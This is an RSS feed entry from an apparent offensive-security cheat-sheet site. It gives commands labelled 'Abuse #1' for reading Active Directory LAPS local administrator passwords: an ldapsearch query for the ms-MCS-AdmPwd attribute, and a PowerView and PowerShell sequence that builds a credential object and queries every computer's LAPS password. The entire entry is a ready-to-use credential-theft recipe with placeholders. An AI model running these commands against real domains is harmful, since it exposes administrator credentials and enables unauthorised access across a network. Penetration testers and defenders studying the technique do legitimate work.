channel.title: ReadLAPSPassword on TLDRBins
channel.description: Recent content in ReadLAPSPassword on TLDRBins

item.title: ReadLAPSPassword
item.description: Abuse #1: Read LAPS Password Linux Windows ldapsearch -h <TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<TARGET> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
